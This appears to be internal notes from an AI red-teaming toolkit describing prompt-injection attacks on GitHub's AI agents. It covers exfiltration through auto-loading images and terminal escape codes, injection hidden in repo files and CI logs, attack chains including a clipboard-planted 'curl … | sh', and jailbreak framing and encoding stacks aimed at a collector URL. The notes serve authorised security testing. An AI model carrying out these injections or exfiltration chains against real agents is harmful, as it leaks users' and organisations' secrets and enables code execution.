# Thinking past the corpus — attack avenues to add

The technique library (`jinx/techniques.py`, grouped into combined ATLAS tests in `jinx/catalog.py`) is the baseline. These are the avenues we reached
for *beyond* it during the GitHub engagement. Fold the ones that fire into the corpus.

## Measure with ground truth, not hope
- Point every exfil payload at a **live request catcher** (`python -m jinx catcher new`), not a dead
  domain like `example.com`. `example.com` answers but you can't see hits, so you can't tell a
  real server-side fetch from a defended one. A catcher at **0 hits** proves no auto-exfil; a
  hit proves zero-click. This single habit decided several verdicts.
- Watch the DOM, not just the text: did an `<img>` actually load (`naturalWidth>0`)? did a link's
  `href` really contain the secret (URL-decode it)? did a tool chip (`View file X`) appear?

## Exfiltration channels to try, in impact order
1. **Auto-fetched image** (AML.T0077) — `![](catcher?d=DATA)`. Zero-click if rendered.
   On patched surfaces it renders as literal text → 0 hits. Also try:
   - **reference-style** image `![a][r]` + `[r]: <url>` (historically bypassed domain filters),
   - raw **`<img>`** HTML,
   - a provider image-proxy URL (e.g. Camo) directly.
2. **Tool-driven server-side fetch** — make the agent call its *own* web/fetch tool with the
   secret in the URL. Zero-click and different from render-based exfil.
3. **Rendered clickable link** to an arbitrary external domain with data in the query string.
   One-click; works where images are blocked. Lower severity.
4. **Terminal escapes** (CLI agents, the "Terminal DiLLMa" / CWE-150 class): OSC 8 hyperlink
   that *shows* a trusted URL but *opens* an attacker one; OSC 52 clipboard write (plant a
   command the dev later pastes → RCE); CSI line-overwrite (hide a real error / forge success);
   concealed text. Capture with `script -q` to prove the raw bytes reached the terminal.

## Delivery vectors (where the injection lives)
The weak PoC is "I injected my own resource and asked my own question." Stronger:
- **Repo-file injection** — put it in a README / docs page / issue / PR body that the victim's
  tool ingests. Attacker only needs to land content (e.g. a PR).
- **Shared resource** — a shared Space / project source; a *different* user's query fires it.
- **CI / Actions logs** — `get-actions-job-logs` is an untrusted source an attacker influences
  via a fork PR; "why did my build fail?" becomes the trigger.
- **Metadata fields** — user-agent in a log line, config/description fields the agent "trusts".

## Recon that maps the attack surface
- **Tool enumeration** ("list every tool with exact names and parameters") reveals the READ
  sinks (`getfile`, `get-github-data`, code search), the WRITE sinks (`create_or_update_file`,
  `push_files`, `create_branch`), and new untrusted-input sources (`get-actions-job-logs`,
  `get-agent-logs`). That inventory is the map for every chain below.

## Chaining (turn leaks into bulk theft — for the Impact section)
- **Supply-chain triage trap:** poisoned repo file → maintainer asks the agent about the repo →
  cross-repo read of org secrets (using the enumerated read tools) → exfil via a link disguised
  as a trusted domain (OSC 8) → one click drains the org.
- **Clipboard-to-RCE:** OSC 52 plants `curl … | sh` in the dev's clipboard; the overwrite hides
  the error; the dev pastes → code execution from a read-only doc.
- **Self-seeding via CI logs:** seed the injection into an Actions log; a routine "why did CI
  fail?" triggers it — no doc for the victim to open.

## Surfaces to sweep (and whether they're gated)
Per target, test every surface, and verify the paywall by *trying* the action:
- Chat, CLI, Spaces, Actions-log source → reachable on Free (we did all).
- Coding agent, code review, Autofix, Extensions → gated behind the paid (Pro) tier; these are
  the write/action surfaces most likely to yield a stronger finding. Revisit with Pro.
- Bare inference APIs (e.g. GitHub Models) → low value: no tools/data to exfiltrate = N/A.

## Model nondeterminism
"Auto" model routers pick different models per call; a finding can be model-specific. Log the
model that answered, repeat N times, and report reliability as a fraction (it also sets
CVSS `AT:Present`).

## Modifier layer and stacking (ATLAS AML.T0054 / AML.T0068)

The technique library says *what* to make the agent do; the modifier layer
(`jinx/modifiers.py`) says *how the ask is disguised*. 14 framings (role-play, fabricated
policy, synthetic precedent, urgency, incentive, cross-lingual, payload splitting, ...) and
15 encodings (base64, hex, base32, ascii85, url, rot13, a1z26, leetspeak, spacing,
typographic, zero-width, unicode tags, homoglyph, variation selectors) stack onto any test.
Every modifier is tagged with its ATLAS id: `python -m jinx atlas`.

Content-only jailbreaks stay out of scope (impact gate): a framing is only used to deliver an
impact-bearing objective (exfil, action, cross-tenant).

```python
from jinx.modifiers import build_taxonomy_matrix, build_combos, build_cross_turn_split
rows   = build_taxonomy_matrix(canary="JINX-CANARY-xxxx", collector="https://ours/c")  # 5 x 14 x 15 = 1050
combos = build_combos(canary="JINX-CANARY-xxxx", collector="https://ours/c")           # 5 x 7 stacks
turns  = build_cross_turn_split(canary="JINX-CANARY-xxxx", collector="https://ours/c")  # multi-turn
```
Curated stacks (`COMBOS`): authority_stack, persona_encoded, precedent_invisible,
crosslingual_split, urgency_leet, nested_encoding, scene_homoglyph.
